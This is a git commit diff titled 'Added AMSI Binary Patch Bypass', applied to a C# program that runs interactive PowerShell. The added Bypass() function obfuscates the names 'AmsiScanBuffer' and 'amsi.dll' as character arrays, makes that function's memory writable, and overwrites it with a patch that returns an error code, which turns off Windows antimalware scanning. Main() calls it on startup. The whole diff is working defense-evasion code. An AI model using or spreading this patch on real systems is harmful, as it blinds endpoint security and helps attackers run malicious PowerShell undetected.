dcd1099bf368377048e7436cfd621ff7c79ac4be
superhac <superhac@users.noreply.github.com>
2021-11-30 13:53:02 -0600

    Added AMSI Binary Patch Bypass

--- InteractiveRunspace.cs
+++ InteractiveRunspace.cs
@@ -4,11 +4,41 @@ using System.Text;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Collections.ObjectModel;
+using System.Runtime.InteropServices;
 
 namespace InteractiveRunspace
 {
     class Program
     {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        static int Bypass()
+        {
+            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
+            String funcName = string.Join("", chars);
+
+            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
+            String libName = string.Join("", chars2);
+
+            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);
+
+            UIntPtr size = (UIntPtr)5;
+            uint p = 0;
+
+            VirtualProtect(Address, size, 0x40, out p);
+            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            Marshal.Copy(Patch, 0, Address, 6);
+
+            return 0;
+
+        }
 
         private static void runCommand(PowerShell ps, string cmd)
         {
@@ -60,6 +90,7 @@ namespace InteractiveRunspace
 
         static void Main(string[] args)
         {
+            Bypass();
             string cmd;
 
             //set a large readline input buffer
